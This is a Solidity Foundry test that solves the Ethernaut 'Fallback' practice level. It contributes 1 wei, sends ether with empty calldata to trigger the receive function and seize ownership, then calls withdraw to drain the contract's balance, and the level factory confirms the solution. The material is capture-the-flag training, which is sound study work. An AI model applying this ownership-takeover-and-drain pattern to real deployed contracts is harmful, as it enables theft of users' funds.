// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {Fallback} from "src/levels/Fallback.sol";
import {FallbackFactory} from "src/levels/FallbackFactory.sol";

// 0xb4c79daB8f259C7Aee6E5b2Aa729821864227e84
contract FallbackTest is Test {
    Fallback private level_1;
    FallbackFactory private factory;
    address private attacker = makeAddr("attacker");

    function setUp() public {
        factory = new FallbackFactory();

        level_1 = Fallback(payable(factory.createInstance(attacker)));
    }

    function testDrainLevel_1Contract() public {
        // Add contribution from deployer
        level_1.contribute{value: 100 gwei}();

        // Add some ether to attacker account
        vm.deal(attacker, 1 ether);

        // Change msg.sender to attacker for all following calls
        vm.startPrank(attacker);

        level_1.contribute{value: 1 wei}();

        uint contractBalanceBeforeAttack = address(level_1).balance;
        emit log_named_uint(
            "Contract balance before attack",
            contractBalanceBeforeAttack
        );

        // Send ether to contract without specifying msg.data
        // Since calldata is empty and msg.value contains non-zero value, this will trigger the receive function
        (bool success, ) = address(level_1).call{value: 1 wei}("");
        assertTrue(success, "Failed to trigger receive function");

        // Check attacker is the new owner
        address newOwner = level_1.owner();
        assertEq(attacker, newOwner);
        emit log_named_address("New Owner", newOwner);

        uint attackerContribution = level_1.getContribution();

        uint attackerBalanceBeforeAttack = attacker.balance;

        // Drain the contract
        level_1.withdraw();

        assertEq(address(level_1).balance, 0, "Contract balance did not drain");

        uint attackerBalanceAfterAttack = attacker.balance;

        uint increment = attackerBalanceAfterAttack -
            attackerBalanceBeforeAttack;
        emit log_named_uint("Increment", increment);

        // Assert balance changes are greater than contributions made
        assertGt(increment, attackerContribution, "Attack failed 1");

        // Assert increment in balance is equal to contract balance
        //assertEq(increment, contractBalanceBeforeAttack, "Attack failed 2");

        emit log_named_uint(
            "Contract balance after attack",
            address(level_1).balance
        );

        // Verify the solution using Ethernaut's validation.
        success = factory.validateInstance(payable(level_1), attacker);
        assertTrue(success, "Validation Failed!!!");

        vm.stopPrank();
    }
}
